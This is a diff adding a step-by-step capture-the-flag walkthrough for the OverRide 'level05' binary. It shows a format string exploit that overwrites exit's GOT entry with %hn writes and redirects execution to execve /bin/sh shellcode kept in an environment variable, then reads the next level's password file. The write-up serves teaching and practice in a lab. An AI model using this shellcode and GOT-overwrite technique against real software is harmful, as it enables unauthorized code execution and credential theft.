@@ -1,1 +1,247 @@
-python3 -c "import sys; sys.stdout.buffer.write(b'A'*200+b'%x'*40+b'\n')" | ./level05
+# Level05 — Walkthrough
+
+## Overview
+
+The binary at `~/level05` reads user input, converts uppercase letters to lowercase, then prints the result using `printf` in an unsafe way. This allows us to exploit a **format string vulnerability** to hijack the program's execution and spawn a shell as the next user.
+
+---
+
+## Step 1: Run the binary and observe its behavior
+
+```
+level05@OverRide:~$ ./level05
+hello
+hello
+```
+
+The program reads a line of input and prints it back. If we type uppercase letters, they come back lowercase:
+
+```
+level05@OverRide:~$ ./level05
+HELLO
+hello
+```
+
+This tells us the program converts uppercase (A-Z) to lowercase before printing.
+
+---
+
+## Step 2: Analyze the disassembly
+
+Using GDB:
+
+```
+gdb ./level05
+(gdb) disas main
+```
+
+From the disassembly we can reconstruct what the program does in pseudocode:
+
+```c
+int main() {
+    char buffer[100];
+    int i = 0;
+
+    fgets(buffer, 100, stdin);       // read up to 100 bytes
+
+    i = 0;
+    while (i < strlen(buffer)) {
+        if (buffer[i] >= 'A' && buffer[i] <= 'Z')  // if uppercase
+            buffer[i] = buffer[i] ^ 0x20;           // convert to lowercase
+        i++;
+    }
+
+    printf(buffer);   // <-- VULNERABILITY: no format string!
+    exit(0);
+}
+```
+
+### The vulnerability
+
+The line `printf(buffer)` is dangerous. The correct usage would be `printf("%s", buffer)`. When user input is passed directly as the first argument to `printf`, the user can inject format specifiers like `%x` or `%n` to read from and **write to** memory. This is called a **format string vulnerability**.
+
+### Why `exit` matters
+
+After the `printf`, the program calls `exit(0)`. It does **not** return from `main` — it jumps through the GOT (Global Offset Table) to the real `exit` function. If we overwrite the address stored in the GOT for `exit`, we can redirect execution anywhere we want.
+
+---
+
+## Step 3: Confirm the format string vulnerability
+
+We test by sending format specifiers as input:
+
+```
+level05@OverRide:~$ ./level05
+%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
+64.f7fcfac0.f7ec3af9.ffffd5ff.ffffd5fe.0.ffffffff.ffffd684.f7fdb000.252e7825
+```
+
+Instead of printing `%x.%x...` literally, the program printed **values from the stack**. Each `%x` reads the next value on the stack as if it were an argument to `printf`. This confirms the format string vulnerability.
+
+---
+
+## Step 4: Find our buffer's offset on the stack
+
+We need to know **where on the stack** our input buffer sits, relative to `printf`'s perspective. We use `%N$x` syntax, which means "print the Nth argument on the stack as hex."
+
+Looking at the 10th value from Step 3: `252e7825`. Let's decode it:
+- `25` = `%`, `2e` = `.`, `78` = `x`, `25` = `%` → this is the start of our own input string `%x.%`!
+
+So our input buffer starts at **offset 10**. We confirm:
+
+```
+level05@OverRide:~$ ./level05
+AAAA%10$x
+aaaa61616161
+```
+
+- `aaaa` = our "AAAA" converted to lowercase
+- `61616161` = hex for "aaaa" (the lowercase version)
+
+This means whatever we place at the beginning of our input, we can reference it with `%10$x`. This will be critical for the write step.
+
+---
+
+## Step 5: Find the GOT address of `exit`
+
+The GOT (Global Offset Table) is a table that holds the real addresses of dynamically linked functions. When the program calls `exit()`, it actually jumps to the address stored in the GOT entry for `exit`. If we overwrite this address, we control where the program jumps.
+
+```
+level05@OverRide:~$ objdump -R ./level05 | grep exit
+080497e0 R_386_JUMP_SLOT   exit
+```
+
+The GOT entry for `exit` is at address **`0x080497e0`**. This is the address we will overwrite.
+
+---
+
+## Step 6: Prepare shellcode in an environment variable
+
+We need somewhere to redirect execution to. We'll place **shellcode** (machine code that spawns `/bin/sh`) in an environment variable. The program's memory will contain this environment variable, so we can jump to it.
+
+```bash
+export SHELLCODE=$(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
+```
+
+This creates:
+- **100 NOP instructions** (`\x90`): a "NOP sled." NOPs do nothing — they just slide execution forward. This gives us a margin of error for the address. We don't need to hit the exact start of the shellcode, just anywhere in the sled.
+- **The shellcode itself**: these bytes are i386 machine instructions that call `execve("/bin/sh")`, giving us a shell.
+
+---
+
+## Step 7: Find the shellcode's address in memory
+
+We need to know where in memory the environment variable ends up. We write a small helper:
+
+```bash
+cat > /tmp/getenv.c << 'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+int main() {
+    printf("%p\n", getenv("SHELLCODE"));
+    return 0;
+}
+EOF
+gcc -m32 -o /tmp/getenv /tmp/getenv.c
+/tmp/getenv
+```
+
+The `-m32` flag is important because our target binary is 32-bit. A 64-bit program would have different stack layout and addresses.
+
+```
+0xffffd7f3
+```
+
+The shellcode lives around `0xffffd7f3`. We'll target `0xffffd830` — aiming into the middle of the NOP sled for safety, since the exact address can shift slightly between programs due to differences in program name length and environment.
+
+---
+
+## Step 8: Craft the format string exploit
+
+### The plan
+
+We want to write the value `0xffffd830` into the memory at address `0x080497e0` (the `exit` GOT entry). When `exit()` is called, it will jump to our shellcode instead.
+
+### Why use `%hn` (half-writes)?
+
+Writing the full value `0xffffd830` with a single `%n` would require printing over 4 billion characters (since `%n` writes the number of characters printed so far). That's not feasible.
+
+Instead, we split the 4-byte address into two 2-byte (short) writes using `%hn`:
+
+| Address       | Value to write | Meaning                    |
+|---------------|---------------|----------------------------|
+| `0x080497e0`  | `0xd830`      | Low 2 bytes of target addr |
+| `0x080497e2`  | `0xffff`      | High 2 bytes of target addr|
+
+### How `%n` / `%hn` works
+
+The `%n` format specifier is unique: instead of **printing** something, it **writes** to memory. It writes the number of characters printed so far to the address pointed to by the corresponding argument on the stack.
+
+- `%n` writes a 4-byte int
+- `%hn` writes a 2-byte short
+
+Since we control what's on the stack (our input buffer is at offset 10), we can place addresses there and use `%hn` to write to them.
+
+### Building the payload
+
+**Bytes 0–3:** Address `0x080497e0` (where to write the low 2 bytes)
+**Bytes 4–7:** Address `0x080497e2` (where to write the high 2 bytes)
+
+These 8 bytes sit at stack offsets 10 and 11 relative to `printf`.
+
+After these 8 bytes, we add format specifiers:
+1. `%55336x` — print 55336 characters of padding. Combined with the 8 address bytes already printed, total = 55344 = `0xd830`. Then `%10$hn` writes this count (as a short) to the address at offset 10 (`0x080497e0`).
+2. `%10191x` — print 10191 more characters. Total now = 65535 = `0xffff`. Then `%11$hn` writes this to the address at offset 11 (`0x080497e2`).
+
+### The math
+
+- After the two 4-byte addresses: **8 characters** printed
+- We want to write `0xd830` = **55344** to the first address
+  - Padding needed: 55344 − 8 = **55336**
+- We want to write `0xffff` = **65535** to the second address
+  - Padding needed: 65535 − 55344 = **10191**
+
+### Final exploit
+
+```bash
+python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%55336x%10$hn%10191x%11$hn"' | ./level05
+```
+
+Note: the addresses `\xe0\x97\x04\x08` are written in **little-endian** byte order (least significant byte first), because x86 is a little-endian architecture.
+
+---
+
+## Step 9: Run the exploit
+
+```bash
+level05@OverRide:~$ python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%55336x%10$hn%10191x%11$hn"' | ./level05
+```
+
+The output will contain a huge amount of whitespace (from the `%55336x` and `%10191x` padding), and then a shell is spawned. To interact with it, pipe commands:
+
+```bash
+(python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%55336x%10$hn%10191x%11$hn"'; cat) | ./level05
+```
+
+The `cat` at the end keeps stdin open so we can type commands in the shell. Then:
+
+```
+cat /home/users/level06/.pass
+```
+
+This gives the password for level06.
+
+---
+
+## Summary of key concepts
+
+| Concept | Role in the exploit |
+|---|---|
+| **Format string vulnerability** | `printf(buffer)` lets us read/write stack memory |
+| **`%x` / `%N$x`** | Read values from the stack to find our buffer offset |
+| **GOT (Global Offset Table)** | Holds function addresses; overwriting `exit@GOT` redirects execution |
+| **`%hn`** | Writes a 2-byte value (number of chars printed so far) to a target address |
+| **NOP sled** | Provides a wide landing zone so we don't need a perfectly exact address |
+| **Shellcode** | Machine code that calls `/bin/sh` to give us a shell |
+| **Little-endian** | x86 stores bytes in reverse order; addresses must be written accordingly |
+| **Environment variable** | A convenient place to store shellcode in the process memory |
